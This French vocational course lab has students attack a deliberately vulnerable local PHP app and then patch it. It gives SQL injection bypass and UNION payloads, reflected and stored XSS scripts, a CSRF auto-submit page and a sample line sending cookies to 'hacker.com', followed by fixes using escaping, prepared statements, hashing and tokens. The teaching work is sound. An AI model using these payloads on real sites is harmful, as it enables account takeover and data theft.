---
title: "TP SISR : Audit et Sécurisation d'une Application Web"
chapter: "BTS SIO 1 : B3 - CyberSécurité"
badgeId: "bts_sql_audit_rgpd"
meta: "Durée : 4 heures · Objectif : Attaquer, Comprendre, Réparer"
---

<ExerciseTabs courseId="bts_sql_audit_rgpd" courseTitle="TP Audit Web">

  <ExerciseSection id="tp-audit-context" label="Contexte & Installation">
    <Enonce>
    ## Contexte du TP

    Agir en tant qu'auditeur en cybersécurité junior. Une entreprise mandate un test de sécurité de son application interne de "Gestion de Notes" avant sa mise en production.
    Le développeur affirme que l'application est sûre car "il y a un mot de passe".

    **Mission :**
    1.  **Auditer** l'application en exploitant les vulnérabilités (Pentest).
    2.  **Comprendre** le code source responsable des failles.
    3.  **Sécuriser** le code source (Patching).

    ## Partie 1 : Mise en place du Lab

    Ce TP utilise un "micro-site" vulnérable conçu spécifiquement pour l'exercice.

    ### Installation
    1.  Récupérer le fichier [lab_securite.php](lab_securite.php).
    2.  Lancer un serveur PHP local.
        *   **Option A (Ligne de commande) :** Ouvrir un terminal dans le dossier du fichier et taper :
            ```bash
            php -S localhost:8000
            ```
        *   **Option B (XAMPP/WAMP) :** Placer le fichier dans `htdocs` ou `www`.
    3.  Ouvrir le navigateur sur `http://localhost:8000/lab_securite.php`.
    </Enonce>
  </ExerciseSection>

  <ExerciseSection id="tp-audit-sqli" label="Injection SQL">
    <Enonce>
    ## Partie 2 : Injection SQL (SQLi) - "L'Effraction"

    L'application vérifie le mot de passe en base de données. Si la requête est mal écrite, elle peut être manipulée.

    ### Analyse du Code (Login)
    Ouvrir `lab_securite.php` et regarder la **ligne 31**.

    Comment sont inserées les données dans la base de données ? Est-ce sécurisé?

    ### Défi 2.1 : Contournement d'authentification
    On va tenter de se connecter en tant qu'**admin** sans connaître le mot de passe.
    Ce formulaire n'est pas protégé contre les payload.
    
    Quel payload peut être utilisé pour passer outre le mot de passe ?

    ### Défi 2.2 : Vol de données (UNION Based)
    Une fois la connexion établie, le champ de recherche de notes est aussi vulnérable.
    La commande SQL `UNION` permet de combiner les résultats de deux requêtes.
    *   **Objectif :** Afficher la liste des utilisateurs et leurs mots de passe à la place des notes.
    *   **Méthode :**
    1.  Quelles colonnes et table(s) sont à utiliser lors de la requête pour récupérer le nom d'utilisateur et le mot de passe ?
    2.  Payload final ressemblant à : `' UNION SELECT c1, c2 FROM table --`
    </Enonce>
  </ExerciseSection>

  <ExerciseSection id="tp-audit-xss" label="XSS">
    <Enonce>
    ## Partie 3 : Cross-Site Scripting (XSS) - "Le Piège"

    Si un site affiche ce que l'utilisateur tape sans nettoyer le texte, il est possible d'y insérer du code JavaScript.

    ### Analyse du Code (Affichage Recherche)
    Regarder la **ligne 122** :
    ```php
    echo "<p>Résultats pour : <b>" . $q . "</b></p>";
    ```
    La variable `$q` (la recherche) est affichée (echo) telle quelle. Si `$q` contient des balises HTML (`<script>`), elles seront interprétées par le navigateur.

    ### Défi 3.1 : XSS Reflected (Le Miroir)
    *   **Action :** Dans la barre de recherche, taper : `<script>alert("Hacked")</script>`
    *   **Résultat :** Une fenêtre d'alerte apparaît, prouvant la possibilité d'exécuter du code sur le navigateur de l'utilisateur.

    ### Défi 3.2 : Vol de Session (Session Hijacking)
    C'est l'attaque la plus critique. Voler le cookie de session d'un admin (le fameux `PHPSESSID` généré automatiquement par PHP) permet d'usurper son identité.

    *   **Action :** Taper : `<script>alert(document.cookie)</script>`
    *   **Question :** Quelle chaîne de caractères s'affiche ? Que représente-t-elle pour le serveur ?
    *   **Note :** Dans une vraie attaque, le script enverrait ce cookie vers un serveur pirate (ex: `window.location='http://hacker.com?cookie='+document.cookie`).

    ### Analyse du Code (Livre d'or)
    Regarder la **ligne 164** :
    ```php
    echo "<div class='message-box'>" . $m['content'] . "</div>";
    ```
    Les messages stockés en base de données sont réaffichés sans filtre. C'est une XSS **Stored** (Stockée), donc permanente.

    ### Défi 3.3 : XSS Stored (Le Champ de Mines)
    Le "Livre d'or" enregistre les messages en base de données et les réaffiche à tous les visiteurs.
    *   **Action :** Poster le message suivant :
        `Bonjour ! <script>window.location = "https://google.com"</script>`
    *   **Conséquence :** Essayer de recharger la page. L'utilisateur est immédiatement redirigé vers Google.
    *   **Impact :** Tout administrateur venant modérer les messages sera redirigé (ou pire, se fera voler son cookie).
    *   *Astuce : Pour réparer le lab, il est nécessaire de redémarrer le serveur PHP (Ctrl+C puis relancer).*
    </Enonce>
  </ExerciseSection>

  <ExerciseSection id="tp-audit-csrf" label="CSRF">
    <Enonce>
    ## Partie 4 : Cross-Site Request Forgery (CSRF) - "La Marionnette"

    L'attaque CSRF force l'utilisateur à faire une action à son insu.
    Le formulaire "Livre d'or" n'a pas de protection (token CSRF).

    ### Défi 4.1 : Création du piège
    Objectif : En tant qu'attaquant, faire poster "J'aime les renards" par l'admin dans le livre d'or sans qu'il s'en rende compte.

    **Procédure guidée :**
    1.  Créer un fichier HTML `piege.html` sur le bureau.
    2.  Copier-coller ce code :
        ```html
        <!-- Ce formulaire est caché et cible le site vulnérable -->
        <form action="http://localhost:8000/lab_securite.php" method="POST">
            <input type="hidden" name="content" value="J aime les renards (HACKED BY CSRF)">
            <input type="hidden" name="new_message" value="1">
        </form>
        <!-- Ce script clique automatiquement sur le bouton envoyer -->
        <script>document.forms[0].submit();</script>
        ```
    3.  Se connecter au Lab en tant qu'admin.
    4.  Ouvrir un nouvel onglet et glisser-déposer le fichier `piege.html` dedans.
    5.  **Question :** Retourner sur le Lab. Que constatez-vous dans le livre d'or ? L'utilisateur connecté a-t-il explicitement écrit ce message ?

    ## Partie 4 bis : Mots de passe et Hachage

    ### Défi 4.2 : Audit des mots de passe
    
    1.  Réutiliser la faille SQLi pour afficher le contenu de la colonne `password` de la table `users`.
    2.  **Question 1 :** Quel constat faites-vous sur le format de stockage des mots de passe dans la base de données ?
    3.  **Question 2 :** Justifiez pourquoi cette pratique représente un risque critique pour l'entreprise (notamment en conformité RGPD).
    </Enonce>
  </ExerciseSection>

  <ExerciseSection id="tp-audit-patching" label="Remédiation">
    <Enonce>
    ## Partie 5 : Remédiation (Patching)

    Il est temps de réparer les dégâts. L'objectif est de modifier le code PHP pour le sécuriser.

    ### Mise en place
    1.  Dupliquer le fichier `lab_securite.php` et le nommer `lab_fixed.php`.
    2.  Ouvrir `lab_fixed.php` dans l'éditeur de code.

    ### Correction 5.1 : Protection contre les XSS
    La règle d'or : **"Échapper les données à l'affichage"**.
    Utiliser la fonction `htmlspecialchars()` qui transforme `<script>` en `&lt;script&gt;`.

    3. Cette modification a un interêt. Préciser lequel.

    **Modifications à faire :**
    4.  **Ligne 122 (Recherche) :**
        *   Avant : `echo "<p>Résultats pour : <b>" . $q . "</b></p>";`
        *   Après : `echo "<p>Résultats pour : <b>" . htmlspecialchars($q) . "</b></p>";`
    5.  **Ligne 164 (Livre d'or) :**
        *   Avant : `echo "<div class='message-box'>" . $m['content'] . "</div>";`
        *   Après : `echo "<div class='message-box'>" . htmlspecialchars($m['content']) . "</div>";`

    **Question :** Réessayer les attaques XSS sur `lab_fixed.php`. Comment le navigateur interprète-t-il le script maintenant (voir code source Ctrl+U) ?

    ### Correction 5.2 : Protection contre les SQLi
    La règle d'or : **"Utiliser des requêtes préparées"**.
    Au lieu de coller les variables, utiliser des marqueurs (`:user`) et demander à la base de données de les traiter comme du texte pur, pas du code.

    5. Comment se prémunir de ces attaques? Expliquer comment fonctionne une requête préparée.
    6. Modifier le formulaire pour que la récupération des notes ne se fasse plus par une requête SQL à remplir mais par une requête préparée.

    **Question :** Réessayer l'injection `' OR 1=1 --`. Le contournement fonctionne-t-il toujours ? Pourquoi ?

    ### Correction 5.3 : Hachage des mots de passe
    La règle d'or : **"Ne jamais stocker de mot de passe en clair"**.

    PHP offre des fonctions natives robustes : `password_hash()` (pour créer) et `password_verify()` (pour vérifier).

    **Modifications à faire :**
    7.  **Au début du fichier (Création des users) :**
        Remplacer l'insertion en clair par :
        ```php
        $pass_admin = password_hash('SuperSecretPassword!123', PASSWORD_DEFAULT);
        $db->exec("INSERT INTO users (username, password) VALUES ('admin', '$pass_admin')");
        ```
    8.  **Lors du Login :**
        Ne plus chercher par mot de passe dans le SQL (`WHERE username = :u AND password = :p`).
        *   Chercher seulement l'utilisateur : `SELECT * FROM users WHERE username = :u`
        *   Vérifier le hash ensuite en PHP :
            ```php
            if ($row = $result->fetchArray()) {
                if (password_verify($p, $row['password'])) {
                    // Connexion OK
                }
            }
            ```

    ### Correction 5.4 : Protection CSRF (Token)
    La règle d'or : **"Vérifier l'origine de la requête"**.

    On ajoute un jeton aléatoire (token) dans la session et dans le formulaire. Si le formulaire envoyé ne contient pas le bon token, on rejette.

    **Modifications à faire :**
    9.  **Génération (après `session_start`) :**
        ```php
        if (empty($_SESSION['token'])) {
            $_SESSION['token'] = bin2hex(random_bytes(32));
        }
        ```
    10. **Dans le formulaire HTML (Livre d'or) :**
        Ajouter un champ caché :
        ```html
        <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
        ```
    11. **Vérification (Traitement du message) :**
        ```php
        if (isset($_POST['new_message'])) {
            if (!hash_equals($_SESSION['token'], $_POST['token'])) {
                die("Erreur CSRF !");
            }
            // ... suite du code d'insertion ...
        }
        ```

    **Question :** Réessayer l'attaque avec `piege.html`. Quel message d'erreur obtenez-vous ? Expliquez pourquoi le piège ne fonctionne plus (indice : le fichier `piege.html` connait-il le token ?).
    </Enonce>
  </ExerciseSection>

  <ExerciseSection id="tp-audit-ctf" label="Challenges (Bonus)">
    <Enonce>
    ## Partie 6 : Challenges CTF (Bonus)

    Pour ceux qui ont terminé en avance. Ces défis ne nécessitent **aucune modification** du fichier `lab_securite.php`, seulement de l'ingéniosité.

    ### Challenge 6.1 : Cartographie de la base de données (A03: Injection)
    Vous avez accès à la table `notes` via la recherche. Mais quelles sont les autres tables cachées ?
    Dans SQLite, une table système spéciale nommée `sqlite_master` contient le schéma de toute la base.

    *   **Objectif :** Utiliser une injection SQL (UNION) dans la barre de recherche pour lister le nom de toutes les tables de la base (`tbl_name`).
    *   **Indice :** La table `sqlite_master` contient les colonnes `type`, `name`, `tbl_name`, `rootpage`, `sql`.
    *   **Question :** Quel est le nom de la table contenant les utilisateurs ? (Prouvez-le avec une capture d'écran du résultat de l'injection).

    ### Challenge 6.2 : Cracking de mot de passe (A02: Cryptographic Failures)
    Vous savez que l'utilisateur `admin` existe. Mais il y a un autre utilisateur nommé `toto`.

    1.  Utilisez l'injection SQL découverte précédemment pour extraire le mot de passe de `toto` depuis la table des utilisateurs.
    2.  Connectez-vous avec `toto`.
    3.  Quelle est sa moyenne ? (Visible uniquement une fois connecté).

    ### Challenge 6.3 : Security Hardening (A05: Security Misconfiguration)
    Le fichier `lab_securite.php` contient cette ligne :
    `header("X-XSS-Protection: 0");`

    4.  **Recherche :** Pourquoi cette ligne est-elle dangereuse en production ? Que fait-elle exactement ?
    5.  **Patching :** Proposez 3 en-têtes HTTP (Headers) de sécurité à ajouter pour durcir l'application (ex: CSP, HSTS...).
    </Enonce>
  </ExerciseSection>

  <ExerciseSection id="tp-audit-report" label="Rapport d'Audit">
    <Enonce>
    ## Partie 7 : Le Rapport d'Audit

    Rédiger un rapport synthétique (PDF ou Markdown) contenant pour chaque faille (SQLi, XSS, CSRF) et pour les bonus :
    1.  **Description :** Expliquer le principe de la faille.
    2.  **Preuve (PoC) :** Capture d'écran de l'attaque réussie.
    3.  **Code Vulnérable :** Copier-coller la ligne PHP responsable.
    4.  **Correction :** Copier-coller le code corrigé.
    </Enonce>
  </ExerciseSection>

</ExerciseTabs>
